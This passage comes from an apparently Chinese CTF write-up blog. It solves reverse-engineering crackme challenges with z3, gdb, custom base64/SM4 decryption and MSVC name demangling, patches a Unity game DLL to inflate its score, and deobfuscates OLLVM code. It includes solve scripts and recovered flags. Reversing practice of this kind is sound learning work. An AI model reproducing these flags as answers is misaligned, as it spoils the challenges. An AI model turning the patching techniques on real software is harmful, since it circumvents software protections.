class="number">25</span>]+l[<span class="number">39</span>]-l[<span class="number">26</span>]+l[<span class="number">23</span>]-l[<span class="number">0</span>]-l[<span class="number">29</span>]-l[<span class="number">32</span>]-l[<span class="number">4</span>]+l[<span class="number">37</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">17</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">5</span>]+l[<span class="number">8</span>]+l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">19</span>]+l[<span class="number">12</span>]+l[<span class="number">20</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">15</span>]-l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">14</span>]==<span class="number">853</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">36</span>]-l[<span class="number">30</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]+l[<span class="number">5</span>]-l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">0</span>]-l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]+l[<span class="number">32</span>]+l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">18</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">13</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">35</span>]-l[<span class="number">26</span>]+l[<span class="number">27</span>]==<span class="number">-28</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">14</span>]-l[<span class="number">33</span>]+l[<span class="number">7</span>]-l[<span class="number">23</span>]-l[<span class="number">25</span>]+l[<span class="number">0</span>]-l[<span class="number">6</span>]-l[<span class="number">21</span>]-l[<span class="number">16</span>]+l[<span class="number">17</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]-l[<span class="number">37</span>]+l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">22</span>]-l[<span class="number">35</span>]-l[<span class="number">10</span>]-l[<span class="number">31</span>]-l[<span class="number">2</span>]+l[<span class="number">41</span>]-l[<span class="number">1</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]-l[<span class="number">34</span>]+l[<span class="number">39</span>]+l[<span class="number">40</span>]+l[<span class="number">32</span>]-l[<span class="number">5</span>]+l[<span class="number">36</span>]-l[<span class="number">27</span>]==<span class="number">-529</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]+l[<span class="number">8</span>]+l[<span class="number">36</span>]+l[<span class="number">35</span>]-l[<span class="number">23</span>]-l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]-l[<span class="number">27</span>]-l[<span class="number">24</span>]+l[<span class="number">26</span>]+l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]-l[<span class="number">2</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">10</span>]-l[<span class="number">17</span>]+l[<span class="number">3</span>]+l[<span class="number">19</span>]+l[<span class="number">22</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]+l[<span class="number">37</span>]+l[<span class="number">16</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">21</span>]-l[<span class="number">12</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]==<span class="number">-12</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">3</span>]+l[<span class="number">26</span>]-l[<span class="number">12</span>]+l[<span class="number">8</span>]-l[<span class="number">35</span>]-l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]+l[<span class="number">13</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]-l[<span class="number">21</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">29</span>]-l[<span class="number">10</span>]-l[<span class="number">38</span>]+l[<span class="number">22</span>]+l[<span class="number">37</span>]+l[<span class="number">5</span>]+l[<span class="number">19</span>]+l[<span class="number">7</span>]+l[<span class="number">16</span>]-l[<span class="number">31</span>]==<span class="number">81</span>)</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        a.append(s.model()[i].as_long())</span><br><span class="line">print(bytes(a))</span><br></pre></td></tr></table></figure>

flag&#123;A_l0ng_10NG_eqU4Ti0n_1s_E4Sy_W1Th_z3&#125;

感觉实际解的话使用栈模型看括号似乎比较容易。

js才是世界上最好的语言。。

参考资料 [BUUCTF--equation_Hk_Mayfly的博客-CSDN博客](https://blog.csdn.net/qq_39542714/article/details/106834909)

## [rev]easy strcmp

1. 使用IDA打开，发现虚假的main函数

2. 进行调试，在puts下断点，找到主函数位于0x55555555481e附近

3. 反编译程序，查看源码

4. 在puts之前一些地方下断点，重新调试

   强制gdb反汇编某个地方

   当gdb接收一个参数时，gdb会尝试反汇编包含那个地址的函数

   当gdb接受两个参数时，gdb会尝试反汇编那个区间的代码

   disassambly start,end

   disassambly start,+len

5. 发现程序主逻辑：把用户输入加上一些偏移量与加密字符串比较c++

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &quot;defs.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> fflag[] = <span class="string">&quot;zer0pts&#123;********CENSORED********&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> diff[] = &#123;<span class="number">0</span>, <span class="number">0x410A4335494A0942</span>ll, <span class="number">0x0B0EF2F50BE619F0</span>ll, <span class="number">0x4F0A3A064A35282B</span>ll&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        *((<span class="keyword">uint64_t</span> *)fflag+i)+=diff[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;fflag&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [rev][安洵杯 2019]crackMe

1. 程序使用了一些异常处理的手法

2. base64表进行了变换

3. 加密4个6位字符都+24了

4. 类base64编码之前还有个变换

5. 对于输入的变换：使用了SM4国密算法

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> decrypt,encrypt</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;1UTAOIkpyOSWGv/mOYFY4R!!&#x27;</span></span><br><span class="line">tab = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&#x27;</span></span><br><span class="line">rtab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">dic[<span class="string">&#x27;=&#x27;</span>]=<span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    dic[tab[(i+<span class="number">24</span>)%<span class="number">64</span>]]=rtab[i]</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="number">-1</span>)</span><br><span class="line">rflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">    rflag+=flag[i+<span class="number">1</span>]</span><br><span class="line">    rflag+=flag[i]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rflag:</span><br><span class="line">    flag+=dic[i]</span><br><span class="line">print(flag)</span><br><span class="line">flag = base64.b64decode(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">flag = int.from_bytes(flag,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">print(flag)</span><br><span class="line">v2=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v2[<span class="number">0</span>] = <span class="number">0x77</span></span><br><span class="line">v2[<span class="number">1</span>] = <span class="number">0x68</span></span><br><span class="line">v2[<span class="number">2</span>] = <span class="number">0x65</span></span><br><span class="line">v2[<span class="number">3</span>] = <span class="number">0x72</span></span><br><span class="line">v2[<span class="number">4</span>] = <span class="number">0x65</span></span><br><span class="line">v2[<span class="number">5</span>] = <span class="number">0x5F</span></span><br><span class="line">v2[<span class="number">6</span>] = <span class="number">0x61</span></span><br><span class="line">v2[<span class="number">7</span>] = <span class="number">0x72</span></span><br><span class="line">v2[<span class="number">8</span>] = <span class="number">0x65</span></span><br><span class="line">v2[<span class="number">9</span>] = <span class="number">0x5F</span></span><br><span class="line">v2[<span class="number">10</span>] = <span class="number">0x75</span></span><br><span class="line">v2[<span class="number">11</span>] = <span class="number">0x5F</span></span><br><span class="line">v2[<span class="number">12</span>] = <span class="number">0x6E</span></span><br><span class="line">v2[<span class="number">13</span>] = <span class="number">0x6F</span></span><br><span class="line">v2[<span class="number">14</span>] = <span class="number">0x77</span></span><br><span class="line">v2[<span class="number">15</span>] = <span class="number">0x3F</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(v2)):</span><br><span class="line">    key|=v2[i]&lt;&lt;((<span class="number">15</span>-i)*<span class="number">8</span>)</span><br><span class="line">res = decrypt(flag,key)</span><br><span class="line">print(res.to_bytes(<span class="number">16</span>,<span class="string">&#x27;big&#x27;</span>))</span><br></pre></td></tr></table></figure>

## [rev][2019红帽杯]childRE

1. 利用用户的输入建立一棵树(层序顺序)

2. 后续遍历1.建立的树

3. 使用UnDecorateSymbolName进行反修饰

4. 利用查表的方式替换outputString，逐一比对

outputString获取脚本

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tab = <span class="string">&#x27;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;\x27ASDFGHJKL:&quot;ZXCVBNM&lt;&gt;?zxcvbnm,./&#x27;</span></span><br><span class="line">c1 = <span class="string">r&#x27;55565653255552225565565555243466334653663544426565555525555222&#x27;</span></span><br><span class="line">c2 = <span class="string">r&#x27;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&#x27;</span></span><br><span class="line">ops = <span class="string">&#x27;&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    dic[tab[i]]=i</span><br><span class="line">ops = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">62</span>):</span><br><span class="line">    ops.append(dic[c1[i]]*<span class="number">23</span>+dic[c2[i]])</span><br><span class="line">print(ops)</span><br><span class="line">print(bytes(ops))</span><br></pre></td></tr></table></figure>

修饰代码

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RopXX</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    RopXX() &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c;</span><br><span class="line">        My_Aut0_PWN(&amp;c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">char</span>* __thiscall <span class="title">My_Aut0_PWN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, __FUNCDNAME__);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> RopXX();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

放入VS运行即可得到修饰后的字符串

?My_Aut0_PWN@RopXX@@QAEPADPAE@Z

根据后续遍历反向构造输入

Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(hashlib.md5(<span class="string">b&#x27;Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP&#x27;</span>).hexdigest())</span><br></pre></td></tr></table></figure>

参考资料

[re | [2019红帽杯]childRE - Mz1 - 博客园](https://www.cnblogs.com/Mz1-rc/p/13769758.html) 最后那里由于粗心错了一位

[第18天：红帽杯2019-childRE_S1lenc3的博客-CSDN博客](https://blog.csdn.net/qq_41858371/article/details/103111366) 本篇博客提供了修饰代码

## [rev][MRCTF2020]PixelShooter

1. 找到Assemably-CSharp.dll，丢进dnspy

2. 直接一个一个类找，找到GameController，看到初始分数相关信息，把初始分数改到很大，击碎飞机得分改到很大

3. 重新编译apk，安装即可得到flag

其它c#逆向工具：ILSpy, dotpeek

## [rev]

使用IDA打开，发现是ollvm混淆过的，在GitHub上面找到deflat脚本

[GitHub - cq674350529/deflat: use angr to deobfuscation](https://github.com/cq674350529/deflat)

执行

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 deflat.py -f att --addr 0x400620</span><br></pre></td></tr></table></figure>

得到att_recovery，继续分析

删除无用语句，得到

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">signed</span> __int64 v4;   <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">    <span class="keyword">int</span> i;               <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">    <span class="keyword">int</span> v6;              <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">    <span class="keyword">int</span> v7;              <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">    <span class="keyword">char</span> s1[<span class="number">48</span>];         <span class="comment">// [rsp+1F0h] [rbp-100h]</span></span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">60</span>];          <span class="comment">// [rsp+220h] [rbp-D0h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v10;    <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">    <span class="keyword">char</span> *input;         <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">    <span class="keyword">int</span> v12;             <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">    <span class="keyword">bool</span> v13;            <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">    <span class="keyword">int</span> v15;             <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">    <span class="keyword">char</span> *v16;           <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">    <span class="keyword">int</span> v17;             <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v18;             <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">    <span class="keyword">bool</span> v19;            <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">    <span class="keyword">char</span> *v20;           <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">    <span class="keyword">int</span> v21;             <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">    <span class="keyword">bool</span> v22;            <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">    __int64 v23;         <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">    <span class="keyword">bool</span> v24;            <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">    __int64 v25;         <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">    __int64 v26;         <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">    __int64 v27;         <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">    __int64 v28;         <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">int</span> v29;             <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">    <span class="keyword">int</span> v30;             <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">    <span class="keyword">char</span> *v31;           <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">int</span> v32;             <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> v33;             <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">bool</span> v34;            <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line">    <span class="keyword">int</span> unk_402170;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>, <span class="number">0L</span>L);</span><br><span class="line">    input = s;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v12 = v6;</span><br><span class="line">        v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">        <span class="keyword">if</span> (!v13)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v14 = s[v6];</span><br><span class="line">        v15 = v14;</span><br><span class="line">        <span class="keyword">if</span> (v15 == <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v16 = &amp;s[v6];</span><br><span class="line">            *v16 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v17 = v6 + <span class="number">1</span>;</span><br><span class="line">        v6 = v17;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v18 = i;</span><br><span class="line">        v19 = v18 &lt; <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">if</span> (!v19)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v20 = s;</span><br><span class="line">        v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v21 = v7;</span><br><span class="line">            v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">            <span class="keyword">if</span> (!v22)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            v23 = v4;</span><br><span class="line">            <span class="keyword">if</span> (v4 &gt;= <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                v27 = v4;</span><br><span class="line">                v28 = <span class="number">2</span> * v27;</span><br><span class="line">                v4 = v28;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                v25 = <span class="number">2</span> * v4;</span><br><span class="line">                v26 = v25;</span><br><span class="line">                v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">            &#125;</span><br><span class="line">            v29 = v7;</span><br><span class="line">            v7 = v29 + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v30 = <span class="number">8</span> * i;</span><br><span class="line">        v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">        *(_QWORD *)v31 = v4;</span><br><span class="line">        *(_QWORD *)v31 = v4;</span><br><span class="line">        v32 = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">    v34 = v33 != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (v34)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

分析写出逆向脚本

